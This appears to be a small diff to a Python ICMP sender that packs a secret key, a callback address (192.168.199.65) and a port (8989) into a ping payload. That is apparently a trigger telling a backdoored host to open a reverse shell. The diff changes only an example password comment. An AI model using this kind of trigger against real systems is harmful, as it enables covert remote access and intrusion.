@@ -25,8 +25,8 @@ def icmp_send(dest_addr, key, reverse_addr, reverse_port):
     dest_addr  =  socket.gethostbyname(dest_addr)
     pkt_checksum = 55555
 
-    command = key + " " + reverse_addr + " " + reverse_port  #icmp data
-	#p4ssw0rd 192.168.199.65 8989
+    command = key + " " + reverse_addr + " " + reverse_port
+	#6u66le 192.168.199.65 8989
     # Make a dummy heder with a fake checksum.
     header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, pkt_checksum, pkt_id, 1)
     bytesInDouble = struct.calcsize("d")
